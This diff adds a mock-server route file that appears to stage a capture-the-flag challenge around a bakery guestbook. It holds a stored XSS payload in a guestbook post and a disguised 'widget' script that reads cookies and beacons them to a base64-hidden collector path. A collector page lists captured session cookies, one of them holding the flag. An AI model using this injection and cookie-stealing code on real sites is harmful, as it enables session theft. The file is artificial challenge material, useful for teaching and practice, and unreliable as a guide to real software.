@@ -1,0 +1,88 @@
+ttl_minutes = 60
+flag_prefix = "crumb"
+
+[[route]]
+method = "GET"
+path = "/"
+[route.respond]
+status = 200
+content_type = "text/html; charset=utf-8"
+body = '''<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><title>Fennel &amp; Rye Bakery - Guestbook</title>
+<style>body{font-family:Georgia,serif;max-width:38rem;margin:2.5rem auto;color:#3a2a1a}blockquote{border-left:3px solid #c98;margin:1rem 0;padding-left:1rem}</style></head>
+<body><h1>Fennel &amp; Rye Bakery</h1><h2>Guestbook</h2>
+<blockquote>Best sourdough in town, the Saturday queue is worth it. <em>- Marta</em></blockquote>
+<blockquote>Do you do gluten-free cakes for birthdays? <em>- Dev</em></blockquote>
+<blockquote>Lovely staff!!<img src=x onerror="var s=document.createElement('script');s.src='/static/{{d:w}}.js';document.body.appendChild(s)"> <em>- Anon</em></blockquote>
+<p><small>Posts are shown as written. Staff: log in at /staff.</small></p>
+</body></html>
+'''
+
+[[route]]
+method = "GET"
+path = "/static/{{d:w}}.js"
+[route.respond]
+status = 200
+content_type = "application/javascript"
+body = '''// gb-widget 1.2
+(function () {
+  var c = document.cookie || "";
+  var t = "{{d:tok}}";
+  var p = atob("L2NvbGxlY3QvZ2lmLnBocA==");
+  new Image().src = p + "?t=" + t + "&c=" + encodeURIComponent(c) + "&r=" + encodeURIComponent(location.href);
+})();
+'''
+
+[[route]]
+path = "/collect/gif.php"
+[route.respond]
+status = 200
+content_type = "image/gif"
+body = '''GIF89a'''
+
+[[route]]
+method = "GET"
+path = "/collect/view.php"
+[route.when]
+query = { "t" = '{{d:tok}}' }
+[route.respond]
+status = 200
+content_type = "text/html; charset=utf-8"
+body = '''<!doctype html><title>collected</title><h3>Captured cookies (3)</h3>
+<table border=1 cellpadding=4>
+<tr><td>2026-11-19 07:12</td><td>fennel_session=3f1d9a; theme=dark</td></tr>
+<tr><td>2026-11-19 07:48</td><td>fennel_session=c04b72; lang=en</td></tr>
+<tr><td>2026-11-19 08:03</td><td>fennel_admin={{flag}}; lang=en</td></tr>
+</table>
+'''
+
+[[route]]
+method = "GET"
+path = "/collect/view.php"
+[route.respond]
+status = 403
+content_type = "text/plain; charset=utf-8"
+body = '''forbidden
+'''
+
+[[route]]
+method = "GET"
+path = "/collect/"
+[route.respond]
+status = 200
+content_type = "text/html; charset=utf-8"
+body = '''<!doctype html><title>Index of /collect</title><h1>Index of /collect</h1><pre>
+<a href="gif.php">gif.php</a>
+<a href="view.php">view.php</a>
+</pre>
+'''
+
+[[route]]
+method = "GET"
+path = "/staff"
+[route.respond]
+status = 200
+content_type = "text/plain; charset=utf-8"
+body = '''staff login (disabled while the guestbook is locked)
+'''
+
